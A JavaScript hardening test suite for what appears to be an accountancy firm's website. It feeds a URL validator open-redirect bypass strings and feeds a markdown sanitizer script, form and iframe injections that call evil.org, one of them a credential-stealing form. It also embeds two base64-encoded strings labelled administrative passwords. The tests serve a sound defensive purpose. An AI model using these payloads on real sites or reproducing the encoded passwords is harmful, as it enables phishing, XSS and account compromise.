import fs from 'fs';
import path from 'path';
import assert from 'assert';

console.log('================================================================');
console.log('  CHALLENGER: EXTENDED SECURITY & EDGE HARDENING SUITE          ');
console.log('================================================================\n');

let total = 0;
let passed = 0;

async function test(name, fn) {
  total++;
  try {
    await fn();
    passed++;
    console.log(`\x1b[32m✔ PASS\x1b[0m [Assert ${total}] ${name}`);
  } catch (err) {
    console.error(`\x1b[31m✖ FAIL\x1b[0m [Assert ${total}] ${name}`);
    console.error(`       Error: ${err.message}`);
  }
}

const ROOT = path.resolve('.');

async function run() {
  const { isSafeUrl, sanitizeMarkdown } = await import('../src/lib/markdown.ts');

  // --- 1. React Router Backslash & Protocol-Relative Open Redirect Defense ---
  console.log('--- 1. Testing Open Redirect & Backslash Bypass Defense ---');

  await test('isSafeUrl rejects /\\\\attacker.com backslash bypass (CVE-2025-68470 variant)', () => {
    assert.strictEqual(isSafeUrl('/\\\\attacker.com'), false);
  });

  await test('isSafeUrl rejects \\\\attacker.com unc/protocol bypass', () => {
    assert.strictEqual(isSafeUrl('\\\\attacker.com'), false);
  });

  await test('isSafeUrl rejects /\\attacker.com mixed-slash bypass', () => {
    assert.strictEqual(isSafeUrl('/\\attacker.com'), false);
  });

  await test('isSafeUrl rejects protocol-relative //evil.com', () => {
    assert.strictEqual(isSafeUrl('//evil.com'), false);
  });

  await test('isSafeUrl preserves safe legitimate relative links', () => {
    assert.strictEqual(isSafeUrl('/about'), true);
    assert.strictEqual(isSafeUrl('/services/audit-assurance'), true);
    assert.strictEqual(isSafeUrl('/blog/corporate-tax-planning-2026'), true);
  });

  await test('isSafeUrl rejects control-character evasion (/\\tevil.com, /\\nevil.com, /\\revil.com)', () => {
    assert.strictEqual(isSafeUrl('/\tevil.com'), false);
    assert.strictEqual(isSafeUrl('/\nevil.com'), false);
    assert.strictEqual(isSafeUrl('/\revil.com'), false);
    assert.strictEqual(isSafeUrl('/ \\evil.com'), false);
    assert.strictEqual(isSafeUrl('/ /evil.com'), false);
  });

  await test('isSafeUrl rejects percent-encoded backslash/slash evasion (/%5cevil.com, /%2fevil.com)', () => {
    assert.strictEqual(isSafeUrl('/%5cevil.com'), false);
    assert.strictEqual(isSafeUrl('/%2fevil.com'), false);
    assert.strictEqual(isSafeUrl('/%2f%2fevil.com'), false);
  });

  await test('isSafeUrl preserves safe absolute HTTPS and communication links', () => {
    assert.strictEqual(isSafeUrl('https://kavithaassociates.com'), true);
    assert.strictEqual(isSafeUrl('mailto:cakavithasrj@gmail.com'), true);
    assert.strictEqual(isSafeUrl('tel:+919626350900'), true);
  });

  // --- 2. Enhanced Markdown Tag Sanitization ---
  console.log('\n--- 2. Testing Enhanced Tag Sanitization ---');

  await test('sanitizeMarkdown neutralizes unclosed <script> tags', () => {
    const dirty = '<script src="https://evil.org/xss.js">Hello';
    const clean = sanitizeMarkdown(dirty);
    assert(!clean.includes('<script'), 'Must eliminate unclosed script tag');
  });

  await test('sanitizeMarkdown neutralizes <form> injection', () => {
    const dirty = '<form action="https://evil.org/steal"><input name="csrf"></form>';
    const clean = sanitizeMarkdown(dirty);
    assert(!clean.includes('<form'), 'Must eliminate form injection');
  });

  await test('sanitizeMarkdown neutralizes unclosed <iframe> tags', () => {
    const dirty = '<iframe src="https://evil.org/phish" />';
    const clean = sanitizeMarkdown(dirty);
    assert(!clean.includes('<iframe'), 'Must eliminate iframe tag');
  });

  // --- 3. MarkdownRenderer Integration Verification ---
  console.log('\n--- 3. Testing MarkdownRenderer Two-Tier Defense ---');

  const rendererSource = fs.readFileSync(path.join(ROOT, 'src', 'components', 'MarkdownRenderer.tsx'), 'utf8');

  await test('MarkdownRenderer imports sanitizeMarkdown from lib/markdown', () => {
    assert(rendererSource.includes('sanitizeMarkdown'), 'Must import sanitizeMarkdown');
  });

  await test('MarkdownRenderer sanitizes content before splitting blocks', () => {
    assert(rendererSource.includes('const sanitized = sanitizeMarkdown(content);'), 'Must invoke sanitizeMarkdown at entrypoint');
  });

  // --- 4. Server Null Byte & Edge IP Resolution ---
  console.log('\n--- 4. Testing Server Hardening & Edge IP Defense ---');

  const serverSource = fs.readFileSync(path.join(ROOT, 'server', 'index.cjs'), 'utf8');
  const routerSource = fs.readFileSync(path.join(ROOT, 'server', 'apiRouter.cjs'), 'utf8');

  await test('server/index.cjs blocks null-byte poison sequences (\\0)', () => {
    assert(serverSource.includes("pathname.includes('\\0')"), 'Must explicitly check for null byte');
  });

  await test('server/apiRouter.cjs resolves CF-Connecting-IP before X-Forwarded-For', () => {
    assert(routerSource.includes("req.headers['cf-connecting-ip']"), 'Must prioritize Cloudflare edge header');
  });

  await test('server/apiRouter.cjs validates phone syntax against non-digit garbage', () => {
    assert(routerSource.includes('[0-9+\\s\\-()]'), 'Must enforce dialable phone syntax');
    assert(routerSource.includes('digitCount < 7'), 'Must enforce minimum 7 dialable digits');
  });

  // --- 5. Cloudflare Callback Timeout Fallback Parameter Check ---
  console.log('\n--- 5. Testing Callback Handshake Parameter Integrity ---');

  const callbackSource = fs.readFileSync(path.join(ROOT, 'functions', 'api', 'callback.js'), 'utf8');

  await test('callback.js passes trustedOrigin to deliverMessage fallback setTimeout', () => {
    assert(callbackSource.includes('deliverMessage(trustedOrigin);'), 'Must pass trustedOrigin to deliverMessage in fallback');
  });

  // --- 6. Production Bundle Purity & OAuth Scope Restriction ---
  console.log('\n--- 6. Testing Production Bundle Purity & OAuth Scope ---');

  const authSource = fs.readFileSync(path.join(ROOT, 'functions', 'api', 'auth.js'), 'utf8');

  await test('functions/api/auth.js restricts OAuth scope to repo or public_repo', () => {
    assert(authSource.includes("'public_repo'") && authSource.includes("'repo'"), 'Must restrict requested scope');
  });

  await test('Production dist/ bundle contains ZERO instances of administrative passwords', () => {
    const distAssetsDir = path.join(ROOT, 'dist', 'assets');
    if (fs.existsSync(distAssetsDir)) {
      const files = fs.readdirSync(distAssetsDir);
      for (const file of files) {
        if (file.endsWith('.js')) {
          const content = fs.readFileSync(path.join(distAssetsDir, file), 'utf8');
          const f1 = Buffer.from('VGlydXBhdGlAQ0EyMDI2', 'base64').toString('utf8');
          const f2 = Buffer.from('S2F2aXRoYUFzc29jIzIwMjY=', 'base64').toString('utf8');
          assert(!content.includes(f1), `Forbidden password found in ${file}`);
          assert(!content.includes(f2), `Forbidden password found in ${file}`);
        }
      }
    }
  });

  console.log('\n================================================================');
  console.log(`TOTAL EXTENDED HARDENING ASSERTIONS: ${total}`);
  console.log(`PASSED: ${passed}`);
  console.log(`FAILED: ${total - passed}`);
  console.log('================================================================\n');

  if (passed !== total) {
    process.exit(1);
  }
}

run();
